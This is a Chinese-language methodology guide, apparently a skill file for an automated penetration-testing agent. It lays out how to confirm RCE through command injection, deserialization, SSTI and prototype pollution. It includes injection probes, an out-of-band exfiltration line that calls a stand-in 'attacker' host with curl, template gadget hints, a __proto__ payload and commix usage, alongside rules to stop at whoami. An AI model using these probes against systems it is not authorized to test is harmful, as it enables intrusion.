# RCE 命令执行判断流程

## 命令注入

> 视角 + 判断流程优先，payload 靠现场构造，不背。

### 排他声明
仅当目标是「用户输入被拼接进系统命令并执行」时用本 skill。

- 反序列化（`rO0AB` / `O:` 开头）→ deserialization.md
- 模板表达式求值（`{{7*7}}` 出 49）→ ssti.md
- SQLi 堆叠 `xp_cmdshell` → sqli skill（只证明注入，不负责拿 shell）
- 文件上传/包含 → file-upload / path-traversal

### 一句话说清
命令注入 = 把「数据」变成「命令的一部分」。验证 = 命令真的执行了（回显/OOB/时间差），不是输入原样出现在响应里。

### 判断流程（★ 核心，任一步 NO 就停）

#### Step 1 — 入口分类（先指纹，别瞎试）

看功能形态：网络诊断（ping/nslookup）、文件处理（解压/转换/重命名）、系统管理。先 1 个请求注入分隔符探针（`;` `|` `&` `$()` `` ` ``）看有无异常回显/报错。

- 报错含命令输出/语法差异 → 进 Step 2
- 完全无差异 → 再试 1-2 个分隔符变体，仍无 → **放弃该参数**

#### Step 2 — 确认标准（防误判）

- 有回显：`whoami`/`id` 输出真实命令结果 → 确认
- 无回显：二选一，都要 **≥3 次稳定**才认
  - 时间差：`sleep 5` vs `sleep 0`，≥3 次稳定 ≥5 秒差（单次延时=网络抖动）
  - OOB：`curl http://attacker/?d=$(id)` 收到回调，≥2 次
- 5 种外带通道（HTTP/DNS/ICMP/反弹 shell/写文件）全失败 → **放弃，别硬试**

#### Step 3 — 停损

`whoami`/`id` 证明执行即停。**不上 shell、不落地 webshell**——证明 RCE 到这一步就够写 P0/P1 报告了。

### 工具
run_tool 调 commix（tool="commix", args="-u URL --batch"）。

### 证据 / 不要做的事

- 证据 = 命令真实输出或 OOB 回调，不是「payload 出现在响应」。
- 时间差判定 ≥3 次，排除网络抖动。
- 不反弹 shell、不落地文件，whoami 即停。
- 盲注外带优先 DNS（比 HTTP 稳定），但别用公共 DNSLog。

---

## 反序列化 RCE

> 视角 + 判断流程优先，payload 靠现场构造（工具生成），不背。

### 排他声明
仅当目标是「服务端反序列化不可信数据」时用本 skill。

- 命令拼接 → command-injection.md
- 模板表达式 → ssti.md
- Cookie 里 XML/签名 token（非 rO0AB）→ 先判 JWT/SAML → oauth-saml-jwt

### 一句话说清
反序列化 RCE = 服务端把攻击者可控的字节流还原成对象，触发魔术方法 / Gadget 链执行代码。指纹：`rO0AB`(Java)、`O:N:`(PHP serialize)、`pickle`(Python)、`Marshal.load`(.NET)。

### 判断流程（★ 核心，任一步 NO 就停）

#### Step 1 — 入口指纹（1-2 个请求）

看 Cookie / ViewState / POST body 的编码特征：

- `rO0AB` 开头 = Java 序列化；`O:` + 类名 = PHP serialize；`gAS`/pickle opcode = Python；Base64 解一遍再看
- 找反序列化 sink：`unserialize()` / `ObjectInputStream.readObject` / `pickle.loads` / `yaml.load`（无 safe_load）/ `Marshal.load`
- 无任何指纹 → 先别往反序列化想，**NO 就停**

#### Step 2 — 确认标准（先无害，别直接打 RCE）

- Java/PHP/Python：先发一个「无害 payload」触发 dnslog/OOB（DNS 查询到你的 interactsh），收到回调 = 反序列化点成立
- 未收到回调 → gadget 链不匹配/无利用点，**放弃**（别盲目堆 ysoserial 全链）

#### Step 3 — 停损

确认可反序列化后，用工具（ysoserial / ysoserial.net / 现场构造 POP 链）打一次 `whoami`/`id` 即停。**不落地内存马、不反弹 shell**。

### 工具
ysoserial（Java）、ysoserial.net（.NET）现场生成；OOB 用 interactsh。

### 证据 / 不要做的事

- 证据 = dnslog/OOB 回调 + 一次 whoami 回显。
- 先无害 dnslog 确认，别一上来打全 gadget 链（容易崩服务）。
- Java 反序列化黑名单绕过（SignedObject/RMI）是深水区，确认点成立即可，别陷进去。
- 不落地 webshell / 内存马。

---

## SSTI 模板注入

> 视角 + 判断流程优先，payload 靠现场构造（引擎定后查文档），不背。

### 排他声明
仅当目标是「用户输入被渲染进服务端模板引擎」时用本 skill。

- 命令拼接 → command-injection.md
- 反序列化 → deserialization.md
- 反射但只在 HTML 上下文（不经模板引擎）→ xss skill

### 一句话说清
SSTI = 模板引擎把「数据」当「模板指令」执行。指纹探针：`{{7*7}}` / `${7*7}` / `#{7*7}` / `%{7*7}` 被求值（出 49）。

### 判断流程（★ 核心，任一步 NO 就停）

#### Step 1 — 求值确认（1-2 个请求）

按语言/框架猜引擎（Python=Jinja2/Mako/Tornado、Java=FreeMarker/Velocity/Thymeleaf、PHP=Smarty、Ruby=ERB、Node=Pug），发对应探针 `{{7*7}}`：

- 输出 49 / 引擎对象 / 版本号 → 模板表达式被求值，进 Step 2
- 原样回显（`{{7*7}}` 还是 `{{7*7}}`）→ **非 SSTI**，是反射 XSS/普通回显，转 xss

#### Step 2 — 引擎定位（1-2 个请求）

看报错信息里的引擎名（`jinja2.exceptions` / `freemarker` / `TemplateError`）或响应头框架指纹，确定引擎 → 查对应 RCE gadget 链。

#### Step 3 — 停损

用对应 gadget 链执行一次 `id`/`whoami` 证明 RCE 即停。**不反弹 shell、不写文件**。

### 工具
无固定 CLI；gadget 链现场构造（Jinja2 `__class__.__mro__.__subclasses__`、FreeMarker `Execute?new()` 等）。

### 证据 / 不要做的事

- 证据 = `{{7*7}}` 出 49（求值成立）+ 一次 whoami 回显。
- 探针先 `{{7*7}}` 别直接 `{{config}}` 或 RCE 链（前者无害，后者可能泄露/触发告警）。
- 引擎没定位前别堆 payload，先看报错指纹。
- Django 默认沙箱难直接 RCE，多数只能泄露 SECRET_KEY，别硬钻对象链。
- 不反弹 shell、不落地文件。

---

## 原型链污染

> 视角 + 判断流程优先，payload 靠现场构造，不背。

### 排他声明
仅当目标是「用户输入被合并进 JS 对象（JSON merge / Object.assign / _.merge / $.extend）」时用本 skill。

- 直接命令拼接 → command-injection.md
- 反射/存储型 XSS（不走原型链）→ xss skill
- NoSQL 操作符注入（$ne/$gt，无污染）→ sqli/nosql 方向

### 一句话说清
原型链污染 = 通过 `__proto__` / `constructor.prototype` 给 Object.prototype 塞属性，改变全站 JS 对象行为 → 服务端落到 child_process/EJS/Pug gadget = RCE，前端落到 jQuery/DOM sink = XSS。

### 判断流程（★ 核心，任一步 NO 就停）

#### Step 1 — 污染点探测（2 个请求）

POST `{"__proto__": {"polluted": "test123"}}` 到 JSON merge 接口，再请求一个能反映对象行为的端点（报错/状态码变化/属性出现）：

- 行为变化 → 污染成立
- 无变化 → 换 `constructor.prototype` 路径再试 1 次，仍无 → **放弃**

#### Step 2 — 落点分类（决定 RCE 还是 XSS）

- 服务端：污染点影响 Node.js 后端对象 → 试 EJS/Pug/child_process gadget → RCE，走 rce 报告
- 客户端：污染点只影响前端 → jQuery/DOM gadget → XSS，走 xss 报告

#### Step 3 — 停损

服务端 `child_process.execSync('id')` 出一次回显即停；客户端 alert 一次即停。不深入。

### 证据 / 不要做的事

- 证据 = `__proto__` 注入后行为变化 + 一次 id/alert 回显。
- 先探污染成立，再谈 gadget，别上来就 EJS RCE payload。
- 前端污染只算 XSS 不算 RCE，别混报。
- 不落地、不反弹。
